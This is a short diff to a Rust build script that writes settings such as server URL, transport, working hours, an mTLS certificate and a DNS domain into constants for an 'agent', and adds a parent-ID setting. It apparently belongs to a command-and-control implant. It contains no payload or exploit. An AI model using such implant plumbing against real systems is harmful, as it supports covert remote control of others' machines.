@@ -20,6 +20,7 @@ fn main() {
     let agent_pfx       = get("AGENT_PFX",             ""); // base64 PKCS12 for mTLS
     let dns_server      = get("AGENT_DNS_SERVER",      "8.8.8.8");
     let dns_domain      = get("AGENT_DNS_DOMAIN",      "");
+    let parent_id       = get("AGENT_PARENT_ID",       "");
 
     // Escape for Rust string literal: backslash and quote
     let escape = |s: &str| s.replace('\\', "\\\\").replace('"', "\\\"");
@@ -38,6 +39,7 @@ pub const WORKING_HOURS:  &str = "{wh}";
 pub const AGENT_PFX:      &str = "{ap}";
 pub const DNS_SERVER:     &str = "{ds}";
 pub const DNS_DOMAIN:     &str = "{dd}";
+pub const PARENT_ID:      &str = "{pi}";
 "#,
         sv = escape(&server_url),
         tr = escape(&transport),
@@ -52,6 +54,7 @@ pub const DNS_DOMAIN:     &str = "{dd}";
         ap = escape(&agent_pfx),
         ds = escape(&dns_server),
         dd = escape(&dns_domain),
+        pi = escape(&parent_id),
     );
 
     let out = env::var("OUT_DIR").unwrap();
